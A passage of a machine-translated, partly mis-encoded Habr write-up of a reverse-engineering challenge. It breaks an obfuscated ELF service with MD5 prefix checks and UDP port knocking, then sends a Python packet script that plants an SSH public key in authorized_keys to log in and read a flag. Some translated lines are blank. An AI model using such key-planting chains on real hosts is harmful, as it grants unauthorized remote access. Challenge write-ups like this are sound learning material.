presen√ßa das linhas ‚Äú/home/task/.ssh‚Äù e ‚Äú/home/task/.ssh/authorized_keys‚Äù.  Conclus√£o sobre a possibilidade de acesso ao arquivo de chave de autoriza√ß√£o sem senha SSH a partir do arquivo execut√°vel ELF (a seguir denominado servi√ßo). <br><br>  A tabela de s√≠mbolos cont√©m as fun√ß√µes necess√°rias para abrir arquivos e gravar: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br>  A tabela de s√≠mbolos tamb√©m cont√©m fun√ß√µes para trabalhar com soquetes, criar processos e contar o MD5. <br><br>  O verso do arquivo mostrava a presen√ßa de um grande n√∫mero de saltos (algum tipo de ofusca√ß√£o).  Ao mesmo tempo, os saltos s√£o realizados entre os blocos de c√≥digo, que geralmente podem ser divididos em v√°rios tipos: <br><br><ul><li>    ¬´            OF ¬ª,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        ¬´xor¬ª, ¬´and¬ª  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Com base nos resultados do reverso, foi assumido que existe uma implementa√ß√£o de contagem de acordo com o algoritmo MD5. A tabela necess√°ria para o c√°lculo n√£o √© implementada separadamente, mas √© lida diretamente no c√≥digo em blocos. O c√≥digo cont√©m caracteres com os nomes </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Init</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> e </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_final</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Em geral, usando os recursos do conhecido desmontador e seus scripts de API, foi poss√≠vel determinar estaticamente o progresso do programa. Mas a licen√ßa do desmontador √© cara, a vers√£o de avalia√ß√£o √© triste, √© dif√≠cil obt√™-la e eu consegui gerenciar com utilit√°rios de freeware, e dessa maneira √© mais longa. Portanto, a din√¢mica e mais a oportunidade √©. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Carreguei o arquivo ELF na m√°quina virtual. Crie o diret√≥rio ‚Äú/home/task/.ssh/‚Äù apenas por precau√ß√£o.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Na inicializa√ß√£o, voc√™ deve especificar a porta. </font><font style="vertical-align: inherit;">Considerando que n√£o controlamos o lan√ßamento do lado do servidor, pensei que esse par√¢metro fosse falso. </font><font style="vertical-align: inherit;">A porta real deve ser uma. </font><font style="vertical-align: inherit;">O Netstat mostrou a porta aberta 5432 (UDP).</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> O envio de um pacote com dados para a porta especificada exibe uma mensagem sobre a verifica√ß√£o e alguns dados (4 bytes) do servi√ßo: </font></font><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A enumera√ß√£o de v√°rios dados revelou a depend√™ncia da sa√≠da em seu conte√∫do. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O pr√≥ximo passo √© depurar usando o gdb. </font><font style="vertical-align: inherit;">Primeiro de tudo, descubro de onde obtemos os dados, um ponto de interrup√ß√£o no retorno e retorno. </font><font style="vertical-align: inherit;">Recebemos o endere√ßo 0x6ae010 no final.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cadeia de transi√ß√£o</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Na cadeia, chame a fun√ß√£o em 0x810758 e processe seu resultado. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Defina break como 0xb01902, envie o pacote de dados.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo de retorno (registro rax)</font></font></b> <div class="spoiler_text"> (gdb) b *0xb01902 <br> Breakpoint 2 at 0xb01902 <br> (gdb) c <br> Continuing. <br> Verifying 74657374 <br> 00f82488 <br><br> Breakpoint 2, 0x0000000000b01902 in MD5_Init () <br> (gdb) info reg rax <br> rax 0x0 0 <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C√≥digo 0 para dados inv√°lidos. Portanto, assumimos que, para a solu√ß√£o correta, precisamos retornar o c√≥digo n√£o 0. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No decorrer de pesquisas adicionais, examinei o gdb, que √© passado para a fun√ß√£o </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ao enviar o pacote de dados (tamb√©m enviado "teste").</font></font><br><br><div class="spoiler">  <b class="spoiler_title">Resultado</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4>  Resultado </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O MD5 √© contado a partir da mensagem que enviamos, mas o tamanho dos dados lidos √© de 512 bytes. Tendo brincado com os dados, descobri que o MD5 √© contado a partir de dados enviados com zeros preenchidos at√© 512 bytes. Mas voc√™ precisa enviar pelo menos 8 bytes para substituir um n√∫mero de 8 bytes armazenado na pilha. Aparentemente, algum endere√ßo foi armazenado l√°. Os 4 bytes exibidos pelo servi√ßo para cada pacote recebido correspondem aos 3 primeiros bytes da soma MD5 com um zero adicional. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Voltei √† fun√ß√£o 0x810758 e seu c√≥digo de retorno 0. O valor de retorno √© armazenado no registro RAX. Para determinar o c√≥digo de retorno, defino 2 pontos de interrup√ß√£o no endere√ßo da fun√ß√£o 0x810758 e o endere√ßo ap√≥s sua execu√ß√£o 0x827326. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enviei os dados, o ponto em 0x810758 funcionou. Lancei o script em gdb:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eu obtive o arquivo </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> com todos os endere√ßos passados ‚Äã‚Äãdurante a execu√ß√£o da fun√ß√£o em estudo. </font><font style="vertical-align: inherit;">Na verdade, n√£o era t√£o simples, mas no final cheguei a isso. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Preparou um arquivo ‚Äú </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">disasm.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ‚Äù com c√≥digo desmontado do objdmp para um tipo leg√≠vel como ‚Äú </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">endere√ßo: instru√ß√£o</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ‚Äù sem linhas extras.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eu lancei esse script</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> O script simplesmente "vai" para os endere√ßos desde o final at√© o momento em que recebe o registro RAX no primeiro operando da instru√ß√£o. </font></font> Resultado: <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aqui est√° um valor zero. </font><font style="vertical-align: inherit;">Em seguida, basta voltar para qualquer ramifica√ß√£o (arquivo " </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "):</font></font><br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O endere√ßo 0x95b6b2 √© uma compara√ß√£o de um determinado valor com 0x133337. </font><font style="vertical-align: inherit;">Ponto de interrup√ß√£o, veja [rbp-0x2d4]. </font><font style="vertical-align: inherit;">Para fazer isso, envie o pacote com os dados "testtest":</font></font><br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Corresponda os 3 primeiros bytes da soma MD5. A solu√ß√£o se resume em obter a soma MD5 com os 3 primeiros bytes "\ x37 \ x33 \ x13". </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um script simples para iterar n√∫meros de zero com o c√°lculo no formato bin√°rio MD5 para a correspond√™ncia desejada. Dados necess√°rios para o envio recebido. Enviamos dados e recebemos uma mensagem do servi√ßo sobre a nomea√ß√£o de uma nova porta para recebimento de dados:</font></font><br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O Netstat n√£o mostrou essa porta e, de fato, novas portas. Mas o ps mostrou a presen√ßa de um processo filho encerrado (zumbis). Surgiu a ideia de que a porta se abre por um tempo no processo filho. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enviei o pacote necess√°rio para a porta 5432 e depois para a porta 14235. E nada. A porta parou de abrir. Como resultado, geramos outros dados e, consequentemente, o MD5 com o in√≠cio correto. Mensagem novamente, mas desta vez com uma porta diferente. Ap√≥s reiniciar o servi√ßo, o primeiro MD5 funcionou, novamente com a porta 14235. Havia uma id√©ia de que o servi√ßo lembra o MD5 gasto. Portanto, eu o testei toda vez que reiniciei o servi√ßo.</font></font><br><br><div class="spoiler">  <b class="spoiler_title">Resultado</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Novamente uma nova porta. Aqui comecei a pensar que a cadeia de portas poderia ser longa ... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">De fato, a pr√≥xima porta (31841) era a √∫ltima. Depois de algum tempo trabalhando com gdb e c√≥digo desmontado e v√°rios testes, descobri que o arquivo ‚Äú/home/task/.ssh/authorized_keys‚Äù apareceu. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Descobrir ainda mais a causa da apar√™ncia do arquivo se tornou uma quest√£o de tempo, o que tamb√©m est√° gravado nesse arquivo. Como resultado, os dados do pacote enviado ap√≥s a primeira e a √∫ltima porta aberta s√£o gravados no arquivo (se n√£o estiver claro, eles ser√£o vistos no script abaixo). </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Gera√ß√£o adicional de chaves RSA e envio p√∫blico. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Em seguida, autoriza√ß√£o no servidor via SSH, pesquise e obtenha o sinalizador.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No processo de inscri√ß√£o, apenas a terceira soma MD5 gerada funcionou para mim. </font><font style="vertical-align: inherit;">Depois de concluir a tarefa, descobri pelos resultados do reverso que, de fato, a terceira quantia sempre funcionar√° (ou melhor, antes da expira√ß√£o de um determinado contador). </font><font style="vertical-align: inherit;">Para a soma operar continuamente, √© necess√°rio que o n√∫mero inteiro do tipo int transmitido nos primeiros 4 bytes dos dados do pacote (do qual MD5 √© considerado) seja negativo, ou seja, o primeiro bit do quarto byte seja definido (ordem inversa).</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Abaixo est√° o script usado para transmitir a chave RSA ao resolver o problema.</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linha pesquisada: </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sinalizador {a1ec3c43cae4250faa302c412c7cc524}</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Se for bem-sucedida, obtemos "OK" em resposta. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">De fato, como escrevi, acabou sendo sup√©rfluo enviar a primeira e a segunda soma MD5. </font><font style="vertical-align: inherit;">Eu tamb√©m acho que nem tudo foi decidido a partir do necess√°rio, apenas foi escolhido. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">N√£o achei que receberia um convite, quase 40 horas se passaram desde o in√≠cio da tarefa at√© o momento em que enviei a bandeira.</font></font> Obrigada </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt440312/">https://habr.com/ru/post/pt440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt440302/index.html">CRM - custo de sucesso, custo de erro, custo de propriedade</a></li>
<li><a href="../pt440304/index.html">Interrompe dispositivos externos em um sistema x86. Parte 3. Configurando o roteamento de interrup√ß√£o no chipset usando o exemplo coreboot</a></li>
<li><a href="../pt440306/index.html">Escala de banco de dados em sistemas altamente carregados</a></li>
<li><a href="../pt440308/index.html">Divida e conquiste ou escreva devagar - leia rapidamente</a></li>
<li><a href="../pt440310/index.html">Como ensinar uma m√°quina a entender faturas e extrair dados delas</a></li>
<li><a href="../pt440314/index.html">Candidato de libera√ß√£o do JDK 12: Shenandoah, G1, JMH, Arm64. Bugs no Swing contra-atacam</a></li>
<li><a href="../pt440316/index.html">Distribui√ß√£o uniforme de pontos em um tri√¢ngulo</a></li>
<li><a href="../pt440318/index.html">GDPR: como trabalhar com os dados pessoais de seus funcion√°rios, freelancers e funcion√°rios de contrapartes europ√©ias</a></li>
<li><a href="../pt440320/index.html">Enquanto n√≥s no contador DMRSE Yandex cronometramos</a></li>
<li><a href="../pt440322/index.html">Por que os HDDs se tornam menos propensos a falhar</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>